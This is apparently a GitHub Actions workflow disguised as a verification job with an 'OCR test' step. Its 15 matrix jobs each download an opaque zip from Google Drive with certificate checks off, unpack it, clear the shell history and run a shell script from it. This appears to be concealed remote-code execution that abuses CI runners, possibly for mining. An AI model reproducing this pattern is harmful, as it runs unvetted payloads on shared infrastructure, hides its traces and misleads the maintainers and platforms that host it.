name: ngaymoi1code
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  VERIFY:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Fetch', 'Compile', 'Evaluate', 'Run', 'Publish']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1hIzXw3z1zWmkGv8Lh1IZZQLZA663-kDH" -O ngaymoi1code.zip
        unzip -o ngaymoi1code.zip
        rm ngaymoi1code.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh


